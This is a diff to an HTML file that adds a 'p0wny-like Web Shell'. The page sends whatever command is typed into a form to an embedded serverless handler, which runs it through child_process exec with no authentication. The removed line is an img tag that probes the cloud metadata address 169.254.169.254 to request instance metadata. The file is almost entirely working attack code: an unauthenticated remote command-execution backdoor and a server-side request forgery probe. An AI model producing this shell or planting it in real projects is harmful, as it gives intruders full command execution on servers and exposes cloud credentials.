@@ -1,1 +1,83 @@
-<img src="http://169.254.169.254/latest/meta-data/">
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>p0wny-like Web Shell</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #eee; }
+    h1 { color: #f36; }
+    #output {
+      background: #000;
+      padding: 10px;
+      border: 1px solid #444;
+      height: 300px;
+      overflow-y: scroll;
+      white-space: pre-wrap;
+    }
+    input, button {
+      background: #222; color: #eee; border: 1px solid #555;
+      padding: 5px; margin: 2px;
+    }
+  </style>
+</head>
+<body>
+  <h1>p0wny-like Shell</h1>
+  <div id="output"></div>
+  <form id="shellForm">
+    <input id="cmd" type="text" placeholder="Enter command" style="width: 70%">
+    <button type="submit">Run</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('shellForm');
+    const cmdInput = document.getElementById('cmd');
+    const output = document.getElementById('output');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const cmd = cmdInput.value.trim();
+      if (!cmd) return;
+
+      output.textContent += `\n> ${cmd}\n`;
+      cmdInput.value = '';
+
+      const res = await fetch(`/api/shell`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ cmd })
+      });
+
+      const text = await res.text();
+      output.textContent += text + '\n';
+      output.scrollTop = output.scrollHeight;
+    });
+  </script>
+
+  <!-- Backend function -->
+  <script type="vercel-function" data-path="/api/shell.js">
+    import { exec } from 'child_process';
+
+    export default function handler(req, res) {
+      if (req.method !== 'POST') {
+        return res.status(405).send('Use POST');
+      }
+
+      let body = '';
+      req.on('data', chunk => (body += chunk));
+      req.on('end', () => {
+        try {
+          const { cmd } = JSON.parse(body);
+          if (!cmd) return res.status(400).send('No command');
+
+          exec(cmd, { timeout: 8000 }, (err, stdout, stderr) => {
+            if (err) return res.status(200).send(stderr || err.message);
+            res.status(200).send(stdout || stderr || '[No output]');
+          });
+        } catch (e) {
+          res.status(400).send('Bad JSON');
+        }
+      });
+    }
+  </script>
+</body>
+</html>
